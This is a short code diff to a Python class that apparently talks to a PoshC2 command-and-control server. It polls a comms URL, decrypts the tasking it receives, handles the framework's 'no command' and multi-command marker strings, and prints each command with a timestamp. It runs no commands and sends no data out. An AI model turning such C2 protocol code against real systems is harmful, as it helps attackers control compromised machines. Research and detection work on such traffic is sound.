@@ -221,7 +221,7 @@ class PoshC2Server:
       infile = StringIO.StringIO(data)
       with gzip.GzipFile(fileobj=infile, mode="r") as f:
         data = f.read()
-    return data
+    return data[16:]
   
   def setcookie( self, value=None ):
     if value:
@@ -330,11 +330,19 @@ class PoshC2Server:
   # Listen to incoming commands
   def listen( self, url ):
     print 'Listening to server on comms URL: ' + url
+    fmt = '%Y-%m-%d %H:%M:%S'
     while True:
       data = self.do_request( url )
-      print data
-      print base64.b64decode( data )
-      print self.decrypt( data )
+      cmd = self.decrypt( data )
+      out = ''
+      if 'fvdsghfdsyyh' in cmd:
+        out = 'No command...'
+      elif '!d-3dion@LD!-d' in cmd:
+        out = '\n'.join(cmd.split('!d-3dion@LD!-d'))
+      else: 
+        out = cmd
+
+      print datetime.datetime.now().strftime(fmt) + ': ' + out
       time.sleep( self.sleeptime )
     return False
 
